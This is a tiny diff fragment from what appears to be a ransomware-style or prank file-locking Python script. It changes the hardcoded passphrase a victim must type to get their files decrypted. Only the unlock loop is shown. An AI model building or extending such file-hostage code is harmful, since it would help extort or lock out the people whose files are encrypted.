@@ -47,7 +47,7 @@ if paths:
 
 while True:
     code = input("Enter decryption code: ").strip()
-    if code == "SorryMasterPRhino":
+    if code == "SorryMasterRhino":
         for file_path in paths:
             decrypt_file(file_path)
         print(f"Decrypted {len(paths)} files.")
